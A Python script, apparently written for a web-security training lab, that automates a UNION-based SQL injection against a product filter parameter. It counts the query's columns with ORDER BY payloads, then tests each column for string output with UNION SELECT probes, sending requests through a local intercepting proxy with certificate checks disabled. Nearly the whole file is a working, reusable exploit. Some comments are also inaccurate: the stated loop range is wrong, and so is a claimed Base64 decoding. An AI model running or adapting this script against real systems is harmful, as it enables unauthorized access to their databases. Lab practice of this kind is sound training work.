import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# The script when run will pass through the below proxy settings
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_get_column_count(url, sqli_payload):
    path = "/filter?category=Pets"
    for i in range(1, 51):  # Testing for column counts from 1 to 20
        test_payload = f"{sqli_payload}{i}-- "
        full_url = f"{url}{path}{test_payload}"
        response = requests.get(full_url, verify=False,proxies=proxies)
        if response.status_code != 200:
            return i - 1  # Return the last successful column count
    return None  # If no errors were encountered, return None

def exploit_sqli_get_string_field(url, sqli_payload, num_columns):
    path = "/filter?category=Pets"
    for i in range(1, num_columns + 1):
        string = "'v2F6UA'"  # Base64 for 'ZazT'
        payload_list = ["NULL"] * num_columns # Initialize all fields as NULL and create a list containing NULLs
        payload_list[i - 1] = string  # Place the string in the i-th position
        string_field_payload = f"{sqli_payload}{','.join(payload_list)}-- "
        response = requests.get(url + path + string_field_payload, verify=False, proxies=proxies)
        if "v2F6UA" in response.text:
            return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  # Get the URL from command line arguments
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(1)
    
    print("[+] Figuring out number of columns...")
    sqli_payload = "'order+by+"
    num_columns = exploit_sqli_get_column_count(url, sqli_payload)
    if num_columns:
        print("[+] The site appears to be vulnerable to SQL Injection, and the number of columns are: %d" % num_columns)
    else:
        print("[-] The site does not appear to be vulnerable to SQL Injection.")

    print("[+] Checking for string field in the columns...")
    sqli_string_payload = "'union+select+"
    has_string_field = exploit_sqli_get_string_field(url, sqli_string_payload, num_columns)
    if has_string_field:
        print("[+] At least one of the columns appears to accept string data.") 
    else:
        print("[-] None of the columns appear to accept string data.")